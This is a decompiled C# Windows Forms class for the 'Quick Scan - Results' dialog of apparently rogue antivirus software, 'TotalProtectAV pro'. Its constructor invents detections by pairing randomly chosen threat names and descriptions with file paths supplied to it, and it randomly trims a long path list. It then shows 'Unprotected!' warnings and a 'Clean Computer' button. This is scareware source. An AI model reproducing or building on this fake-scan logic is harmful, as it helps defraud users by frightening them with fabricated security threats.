using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

public sealed class QuickScanResultDialog : Form
{
	private IContainer icontainer_0;

	private Class7 customPanel1;

	private Class7 panel2;

	private PictureBox pictureBox1;

	private Panel panel3;

	private Label lblCompStatus;

	private Label label1;

	private Button button2;

	private ListView listView1;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	private ColumnHeader columnHeader_2;

	private List<string[]> list_0 = new List<string[]>();

	public bool bool_0;

	public QuickScanResultDialog()
	{
		InitializeComponent();
	}

	public QuickScanResultDialog(List<string> list_1)
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		InitializeComponent();
		Random random = new Random(DateTime.Now.Millisecond / DateTime.Now.Second + 1);
		list_0.AddRange(Class15.smethod_0());
		if (list_1.Count > 13)
		{
			list_1.RemoveRange(7, new Random().Next(0, list_1.Count - 7));
		}
		foreach (string item in list_1)
		{
			int index = random.Next(0, list_0.Count);
			ListViewItem val = new ListViewItem();
			val.get_SubItems().get_Item(0).set_Text(list_0[index][0]);
			val.get_SubItems().Add(item);
			val.get_SubItems().Add(list_0[index][2]);
			listView1.get_Items().Add(val);
		}
		((Control)listView1).Refresh();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_02aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b4: Expected O, but got Unknown
		//IL_054e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0558: Expected O, but got Unknown
		//IL_05ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f7: Expected O, but got Unknown
		customPanel1 = new Class7();
		listView1 = new ListView();
		columnHeader_0 = new ColumnHeader();
		columnHeader_1 = new ColumnHeader();
		columnHeader_2 = new ColumnHeader();
		button2 = new Button();
		panel2 = new Class7();
		pictureBox1 = new PictureBox();
		panel3 = new Panel();
		lblCompStatus = new Label();
		label1 = new Label();
		((Control)customPanel1).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)customPanel1).set_BackColor(Color.White);
		customPanel1.method_5(Color.Empty);
		((Control)customPanel1).get_Controls().Add((Control)(object)listView1);
		((Control)customPanel1).get_Controls().Add((Control)(object)button2);
		((Control)customPanel1).get_Controls().Add((Control)(object)panel2);
		((Control)customPanel1).set_Dock((DockStyle)5);
		customPanel1.method_7(0f);
		customPanel1.method_1(Color.Empty);
		customPanel1.method_3(Color.Empty);
		((Control)customPanel1).set_Location(new Point(0, 0));
		((Control)customPanel1).set_Name("customPanel1");
		((Control)customPanel1).set_Size(new Size(703, 358));
		((Control)customPanel1).set_TabIndex(0);
		listView1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[3] { columnHeader_0, columnHeader_1, columnHeader_2 });
		((Control)listView1).set_Location(new Point(12, 92));
		((Control)listView1).set_Name("listView1");
		((Control)listView1).set_Size(new Size(679, 199));
		((Control)listView1).set_TabIndex(31);
		listView1.set_UseCompatibleStateImageBehavior(false);
		listView1.set_View((View)1);
		columnHeader_0.set_Text("Threat");
		columnHeader_0.set_Width(140);
		columnHeader_1.set_Text("Location");
		columnHeader_1.set_Width(200);
		columnHeader_2.set_Text("Description");
		columnHeader_2.set_Width(300);
		((Control)button2).set_BackgroundImage((Image)(object)Class3.smethod_23());
		((Control)button2).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(472, 297));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(219, 49));
		((Control)button2).set_TabIndex(30);
		((Control)button2).set_Text("Clean Computer");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		panel2.method_5(Color.Empty);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).get_Controls().Add((Control)(object)panel3);
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_Dock((DockStyle)1);
		panel2.method_7(0f);
		panel2.method_1(Color.FromArgb(1, 68, 208));
		panel2.method_3(Color.FromArgb(47, 98, 251));
		((Control)panel2).set_Location(new Point(0, 0));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(703, 82));
		((Control)panel2).set_TabIndex(29);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)(object)Class3.smethod_26());
		((Control)pictureBox1).set_Location(new Point(52, 28));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(52, 49));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox1.set_TabIndex(34);
		pictureBox1.set_TabStop(false);
		((Control)panel3).set_BackgroundImage((Image)(object)Class3.smethod_23());
		((Control)panel3).get_Controls().Add((Control)(object)lblCompStatus);
		((Control)panel3).set_Dock((DockStyle)1);
		((Control)panel3).set_Location(new Point(0, 0));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(703, 26));
		((Control)panel3).set_TabIndex(33);
		((Control)lblCompStatus).set_AutoSize(true);
		((Control)lblCompStatus).set_BackColor(Color.Transparent);
		((Control)lblCompStatus).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompStatus).set_ForeColor(Color.White);
		((Control)lblCompStatus).set_Location(new Point(19, 5));
		((Control)lblCompStatus).set_Name("lblCompStatus");
		((Control)lblCompStatus).set_Size(new Size(459, 16));
		((Control)lblCompStatus).set_TabIndex(0);
		((Control)lblCompStatus).set_Text("Computer Status - Unprotected! Click here to protect your computer.");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Transparent);
		((Control)label1).set_Location(new Point(178, 36));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(361, 32));
		((Control)label1).set_TabIndex(30);
		((Control)label1).set_Text("Warning! TotalProtectAV pro has detected multiple \r\nthreats against your computer\r\n");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(703, 358));
		((Control)this).get_Controls().Add((Control)(object)customPanel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("QuickScanResultDialog");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Quick Scan - Results");
		((Control)customPanel1).ResumeLayout(false);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		bool_0 = true;
		((Form)this).Close();
	}
}
